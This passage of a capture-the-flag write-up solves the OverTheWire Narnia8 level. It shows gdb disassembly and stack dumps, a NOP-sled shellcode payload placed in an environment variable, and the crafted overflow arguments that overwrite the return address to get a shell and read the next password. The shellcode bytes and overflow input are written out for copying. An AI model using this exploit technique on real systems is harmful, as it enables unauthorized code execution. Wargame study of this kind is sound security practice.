   0x080491c3 <+77>:	mov    0x804b228,%eax
   0x080491c8 <+82>:	mov    %eax,%edx
   0x080491ca <+84>:	mov    -0x4(%ebp),%eax
   0x080491cd <+87>:	add    %edx,%eax
   0x080491cf <+89>:	movzbl (%eax),%eax
   0x080491d2 <+92>:	test   %al,%al
   0x080491d4 <+94>:	jne    0x804919e <func+40>
   0x080491d6 <+96>:	lea    -0x18(%ebp),%eax
   0x080491d9 <+99>:	push   %eax
   0x080491da <+100>:	push   $0x804a008
   0x080491df <+105>:	call   0x8049040 <printf@plt>
   0x080491e4 <+110>:	add    $0x8,%esp
   0x080491e7 <+113>:	nop                      <<<<<<<<<<<<<<<< 
   0x080491e8 <+114>:	leave
   0x080491e9 <+115>:	ret
```

Set the breakpoint somewhere at end of the instruction  

```
(gdb) break *func+113
Breakpoint 1 at 0x80491e7
```

First run with `AAAA` ,  to analyze the behavior  memory allocation and pointers. `r AAAA` and examine 

```
(gdb) x/20wx $esp
0xffffd314:	0x41414141	0x00000000	0x00000000	0x00000000
0xffffd324:	0x00000000	0xffffd57e	0xffffd338	0x08049201
0xffffd334:	0xffffd57e	0x00000000	0xf7da1cb9	0x00000002
0xffffd344:	0xffffd3f4	0xffffd400	0xffffd360	0xf7fade34
0xffffd354:	0x0804908d	0x00000002	0xffffd3f4	0xf7fade34
```

see `AAAA` was `0x41414141` at `0xffffd314` , and then null byte was there , next `0xffffd57e	0xffffd338	0x08049201 0xffffd57e` let's examine one by one  

```
(gdb) x/x 0xffffd57e
0xffffd57e:	0x41414141    # This is a  input AAAA  | Blah
(gdb) x/s 0xffffd57e
0xffffd57e:      "AAAA"

(gdb) x/x 0xffffd338
0xffffd338:	0x00000000

(gdb) x/x 0x08049201
0x8049201 <main+23>:	0xeb04c483       # this denotes main+23 note that 23

(gdb) x/x 0xffffd57e
0xffffd57e:	0x41414141
```

view registers type `info registers`

```
(gdb) info registers
eax            0x5                 5
ecx            0x0                 0
edx            0x0                 0
ebx            0xf7fade34          -134554060
esp            0xffffd314          0xffffd314
ebp            0xffffd32c          0xffffd32c
```

`ebp` is the base pointer, and it stores the address of ==the top of the current stack frame== , by definition we know the it's similar to `esp` and it's also a just buffer for `esp` , this denotes both have same content to it. recall ESP register serves as an indirect memory operand pointing to the ==top of the stack== at any time

Let's see what is `main+23` ,  usual  stuffs disassemble main
```
(gdb) disassemble main
```

```c
   0x080491ea <+0>:	push   %ebp
   0x080491eb <+1>:	mov    %esp,%ebp
   0x080491ed <+3>:	cmpl   $0x1,0x8(%ebp)
   0x080491f1 <+7>:	jle    0x8049206 <main+28>
   0x080491f3 <+9>:	mov    0xc(%ebp),%eax
   0x080491f6 <+12>:	add    $0x4,%eax
   0x080491f9 <+15>:	mov    (%eax),%eax
   0x080491fb <+17>:	push   %eax
   0x080491fc <+18>:	call   0x8049176 <func>
   0x08049201 <+23>:	add    $0x4,%esp               <<<<<<<<<<<< # this is a return address of func()
   0x08049204 <+26>:	jmp    0x8049219 <main+47>
   0x08049206 <+28>:	mov    0xc(%ebp),%eax
   0x08049209 <+31>:	mov    (%eax),%eax
   0x0804920b <+33>:	push   %eax
   0x0804920c <+34>:	push   $0x804a00c
   0x08049211 <+39>:	call   0x8049040 <printf@plt>
   0x08049216 <+44>:	add    $0x8,%esp
   0x08049219 <+47>:	mov    $0x0,%eax
   0x0804921e <+52>:	leave
   0x0804921f <+53>:	ret
```

Let table what so far we yielded from that binary 

```
                   Bytes
Bok                - 20 
????               - 4  ???? is probably *blab,you look at .c file b assigned to blah, in mem also its next to AAAA
EBP                - 4 
Return Addr        - 4
```

 ```
(gdb) r AAAA

(gdb) x/10wx $esp
0xffffd314:	0x41414141	0x00000000	0x00000000	0x00000000
0xffffd324:	0x00000000	0xffffd57e	0xffffd338	0x08049201
0xffffd334:	0xffffd57e	0x0000000

(gdb) r AAAAA

(gdb) x/10wx $esp
0xffffd314:	0x41414141	0x00000041	0x00000000	0x00000000
0xffffd324:	0x00000000	0xffffd57d	0xffffd338	0x08049201
0xffffd334:	0xffffd57d	0x00000000

# see input address (blah) 0xffffd57e was changed into 0xffffd57d hex value reduced by 1 
(gdb) r AAAAAA
(gdb) x/10wx $esp
0xffffd314:	0x41414141	0x00004141	0x00000000	0x00000000
0xffffd324:	0x00000000	0xffffd57c	0xffffd338	0x08049201
0xffffd334:	0xffffd57c	0x00000000
```

Let create payload outside gdb , `exit`

Shellcode by Jonathan Salwan

```
\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81
```

```
Nop + Shellcode
```

Exploit , Copy this

```
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81
```

```
narnia8@gibson:/narnia$ export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81'
```

Again go to gdb 

```
gdb narnia8 -q
(gdb) break main
(gdb) run
Breakpoint 1, 0x080491ed in main ()

(gdb) x/s *((char **)environ)
0xffffd502:	"SHELL=/bin/bash"

(gdb) x/s *((char **)environ+1)
0xffffd512:	"SHELLCODE=", '\220' <repeats 61 times>, "\353\021^1ɱ!\200l\016\377\001\200\351\001u\366\353\005\350\352\377\377\377k\fY\232Sgi.q\212\342Skii0cbti0cjo\212\344SRT\212\342\316\201"

but we need shellcode evn , so increment environ+1
(gdb) x/s *((char **)environ+1)
0xffffd512:	"SHELLCODE=", '\220' <repeats 61 times>, "\353\021^1ɱ!\200l\016\377\001\200\351\001u\366\353\005\350\352\377\377\377k\fY\232Sgi.q\212\342Skii0cbti0cjo\212\344SRT\212\342\316\201"

Note the Address 0xffffd512
(gdb) x/s 0xffffd512+5
0xffffd517:	"CODE=", '\220' <repeats 61 times>, "\353\021^1ɱ!\200l\016\377\001\200\351\001u\366\353\005\350\352\377\377\377k\fY\232Sgi.q\212\342Skii0cbti0cjo\212\344SRT\212\342\316\201"

(gdb) x/s 0xffffd512+10
0xffffd51c:	'\220' <repeats 61 times>, "\353\021^1ɱ!\200l\016\377\001\200\351\001u\366\353\005\350\352\377\377\377k\fY\232Sgi.q\212\342Skii0cbti0cjo\212\344SRT\212\342\316\201"

Note address 0xffffd51c
```

That's it. 

```
                   Bytes
Bok                - 20  - 20 * A 
????               - 4  ???? is probably *blab,you look at .c file b assigned to blah, in mem also its next to AAAA
EBP                - 4 AAAA
Return Addr        - 4 0xffffd51c

We want to points return Address to 0xffffd51c (shellcode address)
```

```
narnia8@gibson:/narnia$ ./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA") | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 0bd5 ffff d8d2 ffff 0192 0408  AAAA............
00000020: 0bd5 ffff 0a                             .....
```

```
                   Bytes
Bok                - 20  - 20 * A 
????               - 4  ???? is 0xffffd50b 
EBP                - 4 AAAA
Return Addr        - 4 has to be 0xffffd51c

There are 12 Bytes (4+4+4) means Blah decreases by 12 Hex value as we know before. 
0xffffd50b decrease by 1 --> 12 times
0xffffd4ff new mem address
```

```
                   Bytes
Bok                - 20  - 20 * A 
????               - 4  ???? is 0xffffd4ff
EBP                - 4 AAAA
Return Addr        - 4 0xffffd51c

"AAAAAAAAAAAAAAAAAAAA" + "\xff\xd4\xff\xff" + "AAAA" + "\x1c\xd5\xff\xff"
```

```
./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA\xff\xd4\xff\xffAAAA\x1c\xd5\xff\xff")
AAAAAAAAAAAAAAAAAAAA����AAAA,�������
Segmentation fault (core dumped)
```

Let's move return address slightly in order to get mid of in-between nop `x1c\xd5\xff\xff` to `\x3c\xd5\xff\xff`

```
./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA\xff\xd4\xff\xffAAAA\x3c\xd5\xff\xff")
```
``
<img src="img/Pasted image 20240724205358.png" alt="Example Image" width="1080"/>

We got the shell , `cat /etc/narnia_pass/narnia9`

---

**Narnia9**

<img src="img/Pasted image 20240724205622.png" alt="Example Image" width="1080"/>
Lol , I already wrote  solutions
